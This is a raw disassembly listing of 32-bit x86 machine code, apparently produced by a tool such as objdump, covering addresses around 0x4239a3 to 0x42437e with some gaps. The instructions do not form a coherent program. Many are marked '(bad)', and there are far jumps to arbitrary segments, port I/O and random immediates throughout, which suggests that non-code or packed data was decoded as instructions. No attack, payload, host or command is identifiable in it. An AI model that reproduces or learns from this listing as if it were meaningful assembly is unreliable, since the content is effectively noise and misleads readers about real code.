  4239a3:	jmp    0xf96:0x8f9b1e53
  4239aa:	mov    edi,0x70db21b6
  4239af:	mov    esi,0xd29e3381
  4239b4:	pusha  
  4239b5:	sar    ah,cl
  4239b7:	das    
  4239b8:	jae    0x42396c
  4239ba:	cld    
  4239bb:	jmp    0x287e:0x8cbf0685
  4239c2:	add    esp,DWORD PTR [ebx+ecx*2-0x68234ae2]
  4239c9:	mov    edx,0xf4c65f0b
  4239ce:	test   al,0x8c
  4239d0:	cmp    bh,al
  4239d2:	lock rol BYTE PTR [ebp-0x30],1
  4239d6:	fwait
  4239d7:	add    dh,ch
  4239d9:	cwde   
  4239da:	imul   DWORD PTR [edi-0x5dce051]
  4239e0:	mov    cl,0x66
  4239e2:	adc    BYTE PTR [ebx],cl
  4239e4:	jg     0x42396f
  4239e6:	dec    edx
  4239e7:	mov    ds:0xdcec0964,eax
  4239ec:	fs xor al,0x86
  4239ef:	pop    ss
  4239f0:	jnp    0x423a4f
  4239f2:	cmp    eax,0x7cd5bfd7
  4239f7:	in     al,0x8e
  4239f9:	sub    eax,0xb98f4e10
  4239fe:	sbb    edi,DWORD PTR [ecx]
  423a00:	leave  
  423a01:	outs   dx,DWORD PTR ds:[esi]
  423a02:	clc    
  423a03:	jl     0x4239e3
  423a05:	pop    eax
  423a06:	scas   eax,DWORD PTR es:[edi]
  423a07:	mov    bl,BYTE PTR [edx+0x48]
  423a0a:	add    al,0x3b
  423a0c:	fadd   DWORD PTR [ebx+0x16]
  423a0f:	call   0x8fb0:0xd571f38f
  423a16:	loope  0x423a07
  423a18:	imul   esp,DWORD PTR [ecx],0x28
  423a1b:	(bad)  
  423a1c:	retf   
  423a1d:	lods   eax,DWORD PTR ds:[esi]
  423a1e:	push   ebp
  423a1f:	and    DWORD PTR [edi],ecx
  423a21:	mov    al,0x7e
  423a23:	jge    0x423a4f
  423a25:	pop    ds
  423a26:	popf   
  423a27:	and    bl,bl
  423a29:	mov    ebp,0x441a353f
  423a2e:	mov    bh,0x71
  423a30:	je     0x423a99
  423a32:	lea    esp,[ebp+0x1e6236c0]
  423a38:	std    
  423a39:	sbb    DWORD PTR [edi],esp
  423a3b:	jae    0x423a9b
  423a3d:	pop    edx
  423a3e:	mov    DWORD PTR [ebp+0x20b0f8cd],esp
  423a44:	xor    eax,0x9cd67c0a
  423a49:	ret    0xb5c0
  423a4c:	jge    0x4239d4
  423a4e:	jb     0x423a11
  423a50:	pusha  
  423a51:	sub    BYTE PTR [ebx],al
  423a53:	adc    eax,0x91eff854
  423a58:	xchg   ebx,eax
  423a59:	in     al,dx
  423a5a:	or     DWORD PTR [ecx-0x68b3dd5b],0x5
  423a61:	dec    ecx
  423a62:	mov    eax,DWORD PTR ds:0x59c4d5f8
  423a68:	mov    eax,0xa7b061f7
  423a6d:	inc    esp
  423a6e:	int    0x8f
  423a70:	mov    dh,0x7a
  423a72:	cdq    
  423a73:	push   esi
  423a74:	xchg   edi,eax
  423a75:	mov    al,BYTE PTR [esi-0x33f268b5]
  423a7b:	out    0xe7,al
  423a7d:	dec    esp
  423a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a7f:	repz xchg ebp,eax
  423a81:	cmc    
  423a82:	dec    ecx
  423a83:	adc    DWORD PTR [edx+0x789b8439],ecx
  423a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a8a:	jae    0x423af9
  423a8c:	jnp    0x423ae0
  423a8e:	ja     0x423a82
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	jo     0x423b3e
  423b02:	(bad)  [edi]
  423b04:	jl     0x423b82
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	mov    ebp,0xa9963f9d
  423b11:	aad    0xcd
  423b13:	sahf   
  423b14:	or     BYTE PTR [edi],dl
  423b16:	lds    esi,FWORD PTR [eax+esi*2-0x79]
  423b1a:	xlat   BYTE PTR ds:[ebx]
  423b1b:	jmp    0x423abd
  423b1d:	lea    eax,[edi-0x40497889]
  423b23:	mov    esp,DWORD PTR [ecx+0x37d7acff]
  423b29:	adc    eax,0xe7766dd6
  423b2e:	daa    
  423b2f:	out    dx,al
  423b30:	pop    es
  423b31:	xchg   esp,eax
  423b32:	jmp    0x423b08
  423b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b35:	cmovns esp,DWORD PTR [edi]
  423b38:	shl    BYTE PTR [ecx+ebp*1+0x6d],cl
  423b3c:	jb     0x423b1d
  423b3e:	add    DWORD PTR ds:0x36d88944,ecx
  423b44:	inc    edi
  423b45:	out    0x1b,eax
  423b47:	(bad)  
  423b4a:	(bad)  
  423b4b:	call   0x20de:0xce15250
  423b52:	or     ecx,DWORD PTR [edx+0x4f]
  423b55:	cmovbe esp,DWORD PTR [ebx-0x6ab4b391]
  423b5c:	add    ecx,esi
  423b5e:	push   edx
  423b5f:	pop    eax
  423b60:	lods   eax,DWORD PTR ds:[esi]
  423b61:	jno    0x423bb3
  423b63:	and    al,0x1e
  423b65:	mov    DWORD PTR [ecx],ecx
  423b67:	and    ebx,DWORD PTR [esi]
  423b69:	jecxz  0x423bb7
  423b6b:	mov    ss,WORD PTR [edx-0x4936bfd7]
  423b71:	adc    edx,ebx
  423b73:	adc    DWORD PTR [edx],ecx
  423b75:	iret   
  423b76:	js     0x423be1
  423b78:	mov    ebx,0xbfdc43e1
  423b7d:	(bad)  
  423b7e:	mov    DWORD PTR [edi+0x5],0x136fd8af
  423b85:	fld    DWORD PTR [esi-0x10904129]
  423b8b:	leave  
  423b8c:	fdivr  DWORD PTR [edi-0x4d]
  423b8f:	retf   0xeb0
  423b92:	call   0xdc0441d
  423b97:	lock outs dx,BYTE PTR ds:[esi]
  423b99:	shr    DWORD PTR [esi],0xdd
  423b9c:	lock dec edx
  423b9e:	mov    al,ds:0x2d2ea1a6
  423ba3:	pusha  
  423ba4:	sub    edi,DWORD PTR [ecx-0x41]
  423ba7:	dec    edx
  423ba8:	push   esi
  423ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423baa:	cmc    
  423bab:	lods   eax,DWORD PTR ds:[esi]
  423bac:	out    dx,al
  423bad:	dec    ebp
  423bae:	in     al,0x33
  423bb0:	arpl   sp,si
  423bb2:	in     eax,0xd8
  423bb4:	adc    ebx,esi
  423bb6:	std    
  423bb7:	adc    dh,BYTE PTR [ebp-0x27]
  423bba:	sub    DWORD PTR [eax],ebx
  423bbc:	daa    
  423bbd:	pop    edx
  423bbe:	div    DWORD PTR [edx]
  423bc0:	xchg   al,dh
  423bc2:	push   esi
  423bc3:	fcom   QWORD PTR [ebx]
  423bc5:	cwde   
  423bc6:	out    0xb4,eax
  423bc8:	push   edx
  423bc9:	mov    WORD PTR [ebx+0x1c],cs
  423bcc:	or     al,0x2
  423bce:	cmp    DWORD PTR [ecx-0x5e5afb3b],esi
  423bd4:	mov    dl,0xf0
  423bd6:	dec    BYTE PTR [esi]
  423bd8:	aaa    
  423bd9:	bnd jne 0x423bf8
  423bdc:	dec    ecx
  423bdd:	inc    ecx
  423bde:	add    BYTE PTR [eax+edx*4+0x583b0cd7],ah
  423be5:	les    ebp,FWORD PTR [ebx]
  423be7:	sbb    DWORD PTR [edi+0x3b],esp
  423bea:	scas   eax,DWORD PTR es:[edi]
  423beb:	sbb    al,BYTE PTR [eax]
  423bed:	and    ch,BYTE PTR [ecx-0x5a]
  423bf0:	and    DWORD PTR [ebp-0x1f],esi
  423bf3:	push   edx
  423bf4:	push   ds
  423bf5:	xor    DWORD PTR [ebp+0x40],0x471c9742
  423bfc:	out    0x85,eax
  423bfe:	ja     0x423b9f
  423c00:	outs   dx,BYTE PTR ds:[esi]
  423c01:	or     DWORD PTR [ecx-0x25],edi
  423c04:	nop
  423c05:	ret    
  423c06:	jle    0x423bfe
  423c08:	mov    ch,0xeb
  423c0a:	pop    edi
  423c0b:	and    edx,ecx
  423c0d:	(bad)  
  423c0e:	loopne 0x423c68
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x16446617]
  423c81:	jbe    0x423cb5
  423c83:	aad    0x80
  423c85:	jge    0x423c88
  423c87:	add    BYTE PTR [ecx+eax*1],al
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	clc    
  423c8d:	mov    eax,ds:0xf3be7001
  423c92:	outs   dx,BYTE PTR ds:[esi]
  423c93:	out    dx,eax
  423c94:	jbe    0x423cc3
  423c96:	sahf   
  423c97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c98:	pop    ecx
  423c99:	jae    0x423c49
  423c9b:	xlat   BYTE PTR ds:[ebx]
  423c9c:	mov    ecx,0x87cd13b9
  423ca1:	and    DWORD PTR [ecx+0x0],ecx
  423ca4:	xor    eax,0x1556c9e0
  423ca9:	dec    ebx
  423caa:	inc    esp
  423cab:	and    DWORD PTR [ebx-0x6568f3c1],esi
  423cb1:	inc    esi
  423cb2:	pop    eax
  423cb3:	push   ecx
  423cb4:	jmp    0x5207:0xefb09ff
  423cbb:	call   0x816f96cc
  423cc0:	ja     0x423d00
  423cc2:	pop    eax
  423cc3:	cmp    ebp,ecx
  423cc5:	adc    BYTE PTR [ecx-0xf05fc71],cl
  423ccb:	aad    0x19
  423ccd:	inc    ebx
  423cce:	and    BYTE PTR [edi+0x4ab20516],bh
  423cd4:	xchg   edi,eax
  423cd5:	push   es
  423cd6:	out    0x87,al
  423cd8:	clc    
  423cd9:	les    ebx,FWORD PTR [ebx+edi*8-0x26]
  423cdd:	xchg   edi,eax
  423cde:	icebp  
  423cdf:	sbb    eax,0x3e2277ff
  423ce4:	xor    cl,BYTE PTR [eax]
  423ce6:	pop    esp
  423ce7:	cmp    BYTE PTR [edi+0x16d454c4],cl
  423ced:	push   ebp
  423cee:	les    ecx,FWORD PTR [ecx+0x26]
  423cf1:	and    DWORD PTR ds:0x8cae2c53,edx
  423cf7:	mov    eax,ds:0xdc5ad410
  423cfc:	xchg   edx,eax
  423cfd:	stos   BYTE PTR es:[edi],al
  423cfe:	cmp    esp,DWORD PTR ds:0x70a2c83a
  423d04:	cmp    ebx,ecx
  423d06:	(bad)  
  423d07:	mov    cl,0xa3
  423d09:	rol    ah,0x94
  423d0c:	fldenv [eax]
  423d0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d0f:	bound  eax,QWORD PTR [ebx+0x5ad5c277]
  423d15:	dec    esp
  423d16:	or     ebp,DWORD PTR [ebx-0xe]
  423d19:	pop    es
  423d1a:	shr    DWORD PTR [edi],0x7a
  423d1d:	nop
  423d1e:	push   0x7fcb89e2
  423d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d24:	out    0xaa,al
  423d26:	and    BYTE PTR [esi],cl
  423d28:	jb     0x423d73
  423d2a:	aam    0x4a
  423d2c:	dec    ecx
  423d2d:	aas    
  423d2e:	fcmovne st,st(6)
  423d30:	adc    dl,BYTE PTR [ecx+0x69]
  423d33:	lahf   
  423d34:	repz mov eax,ds:0xdd350be2
  423d3a:	dec    ecx
  423d3b:	sbb    BYTE PTR [ebp-0x48c825d2],bl
  423d41:	sub    al,0xb4
  423d43:	dec    esi
  423d44:	cs hlt 
  423d46:	repnz sub eax,0xad667159
  423d4c:	ds loop 0x423cee
  423d4f:	and    al,0x4b
  423d51:	test   al,0x14
  423d53:	and    bh,bh
  423d55:	mov    esi,esp
  423d57:	nop
  423d58:	cmp    eax,DWORD PTR [ecx]
  423d5a:	mov    DWORD PTR [eax+0x301c1c0e],esi
  423d60:	mov    edx,0xae8708ff
  423d65:	mov    cl,0xe3
  423d67:	xchg   edi,eax
  423d68:	inc    esp
  423d69:	icebp  
  423d6a:	mov    WORD PTR [eax+0x27],fs
  423d6d:	and    ah,BYTE PTR [ebx-0x58]
  423d70:	shl    DWORD PTR [eax+0x588f0da4],1
  423d76:	shr    BYTE PTR [ebx],0x91
  423d79:	jmp    0xecb6:0x67f7907f
  423d80:	ds pop ebx
  423d82:	xchg   esp,eax
  423d83:	stos   BYTE PTR es:[edi],al
  423d84:	adc    DWORD PTR [edi+ecx*4],esi
  423d87:	sub    al,dh
  423d89:	jg     0x423df0
  423d8b:	xchg   esp,eax
  423d8c:	pop    esi
  423d8d:	mov    dl,0x84
  423d8f:	add    BYTE PTR ss:[eax],al
	...
  423df2:	add    BYTE PTR [eax],al
  423df4:	(bad)  
  423df5:	test   BYTE PTR [edi-0x118668f7],0xff
  423dfc:	daa    
  423dfd:	mov    DWORD PTR [eax-0xe88162e],esp
  423e03:	mov    eax,DWORD PTR [esi+edi*2+0x1040001]
  423e0a:	add    BYTE PTR [eax],al
  423e0c:	dec    eax
  423e0d:	push   ss
  423e0e:	adc    BYTE PTR [eax],dh
  423e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e11:	and    DWORD PTR [eax],ebx
  423e13:	push   cs
  423e14:	dec    ecx
  423e15:	ret    0x1b53
  423e18:	pop    ebx
  423e19:	and    eax,0x5e041fea
  423e1e:	adc    bh,dl
  423e20:	or     BYTE PTR [ebx-0x3e],bl
  423e23:	mov    eax,0x2b881be3
  423e28:	mov    bl,0x17
  423e2a:	cdq    
  423e2b:	sbb    dh,BYTE PTR [esi+0x62]
  423e2e:	gs test al,0xf1
  423e31:	pop    ebp
  423e32:	sub    al,0x0
  423e34:	xchg   DWORD PTR [edx],ebp
  423e36:	lahf   
  423e37:	jo     0x423df5
  423e39:	iret   
  423e3a:	and    eax,0xf25dd8da
  423e3f:	push   ecx
  423e40:	sub    eax,0xfb4a1683
  423e45:	inc    ebp
  423e46:	xchg   ch,ch
  423e48:	jbe    0x423e0c
  423e4a:	popf   
  423e4b:	mov    dh,0x59
  423e4d:	in     al,0x2f
  423e4f:	mov    al,0x5e
  423e51:	es loopne 0x423e6b
  423e54:	rcr    esp,cl
  423e56:	jmp    0x6c395e34
  423e5b:	pop    eax
  423e5c:	dec    ebp
  423e5d:	inc    ebp
  423e5e:	dec    ebx
  423e5f:	inc    ecx
  423e60:	add    BYTE PTR ds:0x11003e10,ch
  423e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423e67:	test   eax,edx
  423e69:	xlat   BYTE PTR ds:[ebx]
  423e6a:	jp     0x423eaf
  423e6c:	or     eax,0x781b459d
  423e71:	stc    
  423e72:	mov    WORD PTR [esi+0x49cc3f38],ds
  423e78:	or     DWORD PTR [ebx-0x21739166],ecx
  423e7e:	ja     0x423ea5
  423e80:	fdivr  st(0),st
  423e82:	jmp    0xb2bbedc9
  423e87:	and    ah,BYTE PTR [eax+eax*1]
  423e8a:	mov    ds:0x1b154718,eax
  423e8f:	fwait
  423e90:	gs jg  0x423e21
  423e93:	dec    eax
  423e94:	out    0x8e,eax
  423e96:	inc    ebx
  423e97:	inc    ebx
  423e98:	sub    ebp,edi
  423e9a:	stos   DWORD PTR es:[edi],eax
  423e9b:	cmp    bl,al
  423e9d:	hlt    
  423e9e:	and    ebx,DWORD PTR [ecx]
  423ea0:	(bad)  
  423ea1:	fmul   DWORD PTR [esi]
  423ea3:	jns    0x423e3f
  423ea5:	mov    ebx,0x8043df85
  423eaa:	cmc    
  423eab:	pop    fs
  423ead:	les    ecx,FWORD PTR [edi+0x6d]
  423eb0:	cwde   
  423eb1:	jl     0xd064f519
  423eb7:	sbb    ah,BYTE PTR [edi]
  423eb9:	in     eax,dx
  423eba:	sbb    BYTE PTR ss:[ebx+0x10ac9240],dh
  423ec1:	imul   edx,DWORD PTR [eax],0xa7c0914f
  423ec7:	and    esp,edx
  423ec9:	mov    ch,0xac
  423ecb:	bound  edi,QWORD PTR [ebx+0x64]
  423ece:	test   DWORD PTR ds:0xa8064ab4,eax
  423ed4:	mov    al,0x80
  423ed6:	scas   al,BYTE PTR es:[edi]
  423ed7:	pop    es
  423ed8:	dec    edx
  423ed9:	push   esi
  423eda:	and    BYTE PTR [edi],ah
  423edc:	sub    DWORD PTR ds:0xb4980be7,ebx
  423ee2:	outs   dx,BYTE PTR ds:[esi]
  423ee3:	dec    ebp
  423ee4:	push   ebp
  423ee5:	test   dh,dh
  423ee7:	(bad)  
  423ee8:	shl    BYTE PTR [esi+0x18],1
  423eeb:	mov    bl,0xcb
  423eed:	loop   0x423f1c
  423eef:	jl     0x423e7b
  423ef1:	sub    ch,BYTE PTR [edx+0x38]
  423ef4:	outs   dx,BYTE PTR ds:[esi]
  423ef5:	inc    esp
  423ef6:	mov    dl,BYTE PTR [edx+0x5b8bdfc8]
  423efc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423efd:	mov    DWORD PTR [edx-0x3a21406d],ecx
  423f03:	pop    ebx
  423f04:	mov    fs,esp
  423f06:	stos   BYTE PTR es:[edi],al
  423f07:	imul   esi,DWORD PTR [edx-0x4b],0xffffffb3
  423f0b:	mov    ch,0x9c
  423f0d:	jg     0x423f07
  423f0f:	or     al,0x0
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	jge    0x423f25
  423f82:	(bad)  
  423f83:	dec    BYTE PTR [eax+0x400017f]
  423f89:	add    DWORD PTR [eax],eax
  423f8b:	add    BYTE PTR [ebp+0x35],ch
  423f8e:	sub    esp,DWORD PTR [edx+edi*2]
  423f91:	push   edi
  423f92:	(bad)  
  423f93:	jo     0x423f3e
  423f95:	iret   
  423f96:	jno    0x423fcb
  423f98:	mov    ds:0xb8b9ffc9,eax
  423f9d:	jge    0x423f68
  423f9f:	dec    eax
  423fa0:	push   ebp
  423fa1:	mov    ebx,0xc7035f44
  423fa6:	sbb    DWORD PTR [edi],ebp
  423fa8:	je     0x423fd8
  423faa:	inc    ebp
  423fab:	out    0xb7,al
  423fad:	daa    
  423fae:	mov    edx,0x4a986964
  423fb3:	pop    ss
  423fb4:	scas   al,BYTE PTR es:[edi]
  423fb5:	jg     0x42401c
  423fb7:	pop    edi
  423fb8:	and    al,0x9d
  423fba:	xchg   edi,eax
  423fbb:	fwait
  423fbc:	mov    DWORD PTR [ecx-0x66],ebx
  423fbf:	jl     0x42403e
  423fc1:	adc    BYTE PTR [ecx-0x5243692a],al
  423fc7:	jg     0x424026
  423fc9:	mov    ch,BYTE PTR [ebx+0x68]
  423fcc:	dec    ebp
  423fcd:	sbb    ch,cl
  423fcf:	inc    ebp
  423fd0:	and    ebx,esp
  423fd2:	cmp    cl,dl
  423fd4:	add    DWORD PTR [esi+0x5090f603],edx
  423fda:	mov    DWORD PTR [ebx],esi
  423fdc:	fwait
  423fdd:	sbb    BYTE PTR [eax-0x23],bh
  423fe0:	imul   eax,DWORD PTR [edx],0xfffffff9
  423fe3:	adc    eax,0xb3de226d
  423fe8:	psrld  xmm7,XMMWORD PTR [edx]
  423fec:	xchg   ebx,eax
  423fed:	sti    
  423fee:	in     al,0xf3
  423ff0:	jmp    0xaef2:0xa67da332
  423ff7:	add    bh,BYTE PTR [edi-0x11305b72]
  423ffd:	je     0x423fab
  423fff:	into   
  424000:	and    edx,DWORD PTR gs:[ebx+eiz*2]
  424004:	push   cs
  424005:	imul   eax,DWORD PTR [edx+0xe7091b7],0xffffffbe
  42400c:	mov    eax,0x2eabff84
  424011:	inc    BYTE PTR ds:0x3096b0b7
  424017:	sar    BYTE PTR [ecx-0x19],1
  42401a:	sub    DWORD PTR [edi],eax
  42401c:	das    
  42401d:	and    bl,BYTE PTR [edi+eax*2+0x22c42891]
  424024:	les    ebp,FWORD PTR [ecx+0x71]
  424027:	in     al,0x57
  424029:	adc    al,0xb7
  42402b:	inc    eax
  42402c:	fwait
  42402d:	inc    esi
  42402e:	mov    dl,0xd5
  424030:	ja     0x423fbe
  424032:	cmp    BYTE PTR [ecx],bl
  424034:	dec    edi
  424035:	push   ss
  424036:	(bad)  
  424037:	mov    esp,0x60dc7a2e
  42403c:	push   ebx
  42403d:	xlat   BYTE PTR ds:[ebx]
  42403e:	push   0x44
  424040:	into   
  424041:	xchg   ecx,eax
  424042:	fst    QWORD PTR [esi]
  424044:	sub    al,0x97
  424046:	mov    edx,0xcbb6aea5
  42404b:	cli    
  42404c:	xlat   BYTE PTR ds:[ebx]
  42404d:	mov    cl,0xb3
  42404f:	shl    DWORD PTR [ebx],cl
  424051:	(bad)  
  424052:	popf   
  424053:	jmp    0x62eb4547
  424058:	outs   dx,BYTE PTR ds:[esi]
  424059:	push   esi
  42405a:	dec    ecx
  42405b:	push   ecx
  42405c:	dec    eax
  42405d:	mov    eax,0x50f6f03b
  424062:	jne    0x4240db
  424064:	add    eax,0xab9ab6d9
  424069:	pop    esi
  42406a:	mov    dl,0xe9
  42406c:	dec    esp
  42406d:	cmp    dl,al
  42406f:	xchg   DWORD PTR [ecx+0x4a],ebx
  424072:	add    BYTE PTR [ecx-0x4b],al
  424075:	icebp  
  424076:	adc    al,0xdd
  424078:	clc    
  424079:	sbb    eax,0x42a8cfac
  42407e:	push   0x6fe507c9
  424083:	mov    cl,0x8
  424085:	xchg   ch,ah
  424087:	clc    
  424088:	sahf   
  424089:	test   al,0x9d
  42408b:	jge    0x4240ff
  42408d:	in     eax,0xe0
  42408f:	jae    0x424091
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	cmp    al,0xcc
  424102:	pop    ebp
  424103:	sbb    DWORD PTR [eax+eax*4+0x1040001],ecx
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    fs,WORD PTR [esi]
  42410e:	jo     0x424185
  424110:	mov    WORD PTR [edi+ebx*8+0x17],ds
  424114:	(bad)  
  424115:	into   
  424116:	or     ch,BYTE PTR [ebx-0x6c]
  424119:	and    BYTE PTR [ebp-0xb],dh
  42411c:	mov    bh,0xcd
  42411e:	js     0x4240b8
  424120:	stos   BYTE PTR es:[edi],al
  424121:	push   edx
  424122:	sbb    DWORD PTR [ebp+0x7f],0x4d
  424126:	cmp    eax,0xcd459bd8
  42412b:	test   DWORD PTR [esi-0x2652f7ab],edx
  424131:	sbb    eax,0xadd13115
  424136:	mov    ebp,ecx
  424138:	ins    DWORD PTR es:[edi],dx
  424139:	cmp    ch,BYTE PTR [ebx+0x1a956362]
  42413f:	dec    esi
  424140:	add    eax,0x30ec8b01
  424145:	repnz push cs
  424147:	cmp    dh,BYTE PTR [edx+esi*8-0x42]
  42414b:	shl    DWORD PTR [ebp-0x65],cl
  42414e:	js     0x42411f
  424150:	dec    ebx
  424151:	dec    esi
  424152:	cld    
  424153:	add    BYTE PTR [ecx-0x6107524a],dh
  424159:	or     eax,0x9da4bba4
  42415e:	loope  0x424124
  424160:	xchg   ebx,eax
  424161:	pop    edx
  424162:	sbb    al,0xc1
  424164:	ret    
  424165:	ss and al,0x3a
  424168:	cs ins BYTE PTR es:[edi],dx
  42416a:	adc    al,0x87
  42416c:	ins    DWORD PTR es:[edi],dx
  42416d:	pop    ecx
  42416e:	inc    ecx
  42416f:	sub    esi,DWORD PTR [ebp-0x3e]
  424172:	mov    cs,WORD PTR [edx-0x7]
  424175:	inc    esi
  424176:	sub    eax,DWORD PTR [edi-0x2f]
  424179:	xchg   ebp,eax
  42417a:	paddd  mm7,QWORD PTR [ebp+0x796ec31]
  424181:	pop    edi
  424182:	push   ds
  424183:	mov    ebp,0xc575b83d
  424188:	aaa    
  424189:	and    ecx,DWORD PTR [edx-0x44]
  42418c:	(bad)  
  42418d:	or     eax,0x52278b3d
  424192:	or     al,0x93
  424194:	outs   dx,DWORD PTR ds:[esi]
  424195:	or     al,0x5b
  424197:	or     DWORD PTR [ebx+esi*1-0x5d003bfa],edx
  42419e:	repz cmp al,0x2e
  4241a1:	mov    bh,BYTE PTR [esi]
  4241a3:	mov    ds:0x1b6a44be,eax
  4241a8:	iret   
  4241a9:	cmp    BYTE PTR [ecx+0x2b],0xff
  4241ad:	or     edi,DWORD PTR [ebp-0x2b]
  4241b0:	pop    ecx
  4241b1:	dec    eax
  4241b2:	out    dx,eax
  4241b3:	inc    esp
  4241b4:	mov    ebx,0xf0c29b11
  4241b9:	lods   al,BYTE PTR ds:[esi]
  4241ba:	mov    edx,0x8b8826cc
  4241bf:	outs   dx,BYTE PTR ds:[esi]
  4241c0:	mov    ah,ch
  4241c2:	add    BYTE PTR [edx+0x75],cl
  4241c5:	sbb    eax,0x31a4f179
  4241ca:	in     al,0x31
  4241cc:	adc    eax,DWORD PTR [edi]
  4241ce:	test   DWORD PTR [ecx+0x67],0x92f1dec3
  4241d5:	and    DWORD PTR [edi-0x3],esi
  4241d8:	mov    ebx,0x8a1dcd9f
  4241dd:	pop    ds
  4241de:	inc    eax
  4241df:	xchg   ecx,eax
  4241e0:	in     eax,0xe3
  4241e2:	add    DWORD PTR [edi+ebx*8+0x24609401],edi
  4241e9:	push   0x73
  4241eb:	jnp    0x42426a
  4241ed:	test   eax,0xc0aa0424
  4241f2:	dec    edi
  4241f3:	mov    dl,BYTE PTR [ebx+0x34]
  4241f6:	rcl    BYTE PTR [edi],cl
  4241f8:	shl    BYTE PTR fs:[esi],0xb2
  4241fc:	push   edx
  4241fd:	fcomp  DWORD PTR [ebp+0x5dba5c14]
  424203:	inc    edx
  424204:	jb     0x4241a5
  424206:	mov    ch,0xfa
  424208:	imul   eax,DWORD PTR [ebx-0x42b88b44],0x5b
  42420f:	and    al,0x0
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	stos   BYTE PTR es:[edi],al
  424281:	test   al,0x87
  424283:	mov    DWORD PTR [eax+0x4000181],edx
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    ch,dl
  42428d:	sbb    eax,esp
  42428f:	int3   
  424290:	mov    ebx,0x65fa207a
  424295:	sahf   
  424296:	scas   al,BYTE PTR es:[edi]
  424297:	gs (bad) 
  424299:	mov    al,0xd3
  42429b:	enter  0x81cc,0x77
  42429f:	ja     0x424296
  4242a1:	fwait
  4242a2:	xchg   ebx,eax
  4242a3:	jecxz  0x42424d
  4242a5:	aaa    
  4242a6:	dec    esi
  4242a7:	shr    DWORD PTR [esi+0x1f06a6d4],0x45
  4242ae:	sbb    eax,0x8a328602
  4242b3:	ror    DWORD PTR [eax],0xaa
  4242b6:	push   eax
  4242b7:	sub    ch,BYTE PTR [edx*1+0x5c16e06f]
  4242be:	out    dx,eax
  4242bf:	mov    eax,ds:0xa4e9aaa5
  4242c4:	and    al,0xc6
  4242c6:	mov    dh,0x8b
  4242c8:	lea    esp,ds:0xcb4cfae9
  4242ce:	pop    edi
  4242d0:	icebp  
  4242d1:	sbb    eax,edi
  4242d3:	es out 0x6,al
  4242d6:	fbld   TBYTE PTR [ecx+0x4c]
  4242d9:	retf   0x6c52
  4242dc:	popf   
  4242dd:	pop    ecx
  4242de:	push   esi
  4242df:	fstp   QWORD PTR [ebp+0x9fc4a8f]
  4242e5:	mov    esp,0xbb9949
  4242ea:	rol    BYTE PTR [eax+eax*2+0x7c],1
  4242ee:	out    0x4f,al
  4242f0:	cmp    dl,BYTE PTR [ebx+0x1e232c9]
  4242f6:	ror    DWORD PTR [eax+0x1d38f5e3],1
  4242fc:	popa   
  4242fd:	mov    eax,fs
  4242ff:	icebp  
  424300:	jne    0x424324
  424302:	pop    edi
  424303:	scas   eax,DWORD PTR es:[edi]
  424304:	jbe    0x424363
  424306:	mov    ds:0xaf90c416,eax
  42430b:	(bad)  
  42430d:	add    edi,DWORD PTR [ebx+edi*1]
  424310:	and    DWORD PTR [ebp-0x172a74ed],eax
  424316:	push   ds
  424317:	cld    
  424318:	inc    esi
  424319:	fst    QWORD PTR [edx-0x4f2b7aff]
  42431f:	jmp    0x23aa79b6
  424324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424325:	xor    eax,0x3dcec198
  42432a:	fisttp QWORD PTR [ebx+0x7]
  42432d:	ins    BYTE PTR es:[edi],dx
  42432e:	push   edx
  42432f:	mov    ah,0xe4
  424331:	xor    al,0x49
  424333:	les    ebx,FWORD PTR [ebp+0x170a162e]
  424339:	dec    esp
  42433a:	loope  0x424353
  42433c:	ins    BYTE PTR es:[edi],dx
  42433d:	adc    eax,0x9b113320
  424342:	shrd   DWORD PTR [edi],esp,0x54
  424346:	mov    al,0x6f
  424348:	sar    DWORD PTR [ebp-0xd],0x1b
  42434c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42434d:	jmp    0x4243ae
  42434f:	cmp    ebx,ebp
  424351:	cld    
  424352:	les    eax,FWORD PTR [ebx+esi*4+0x5a]
  424356:	or     al,0x12
  424358:	adc    DWORD PTR [ecx-0x3bffbe65],0x75
  42435f:	arpl   WORD PTR [edi],ax
  424361:	push   edi
  424362:	inc    edx
  424363:	jge    0x424395
  424365:	sbb    BYTE PTR [eax],dl
  424367:	loopne 0x4243b5
  424369:	shl    BYTE PTR [eax+0x48e4a0d9],0x5e
  424370:	sbb    edx,esi
  424372:	pop    edx
  424373:	loope  0x424309
  424375:	lea    edi,[edi]
  424377:	scas   al,BYTE PTR es:[edi]
  424378:	xlat   BYTE PTR ds:[ebx]
  424379:	mov    ch,0xdc
  42437b:	lods   eax,DWORD PTR es:[esi]
  42437d:	dec    eax
  42437e:	mov    edx,0x450be477
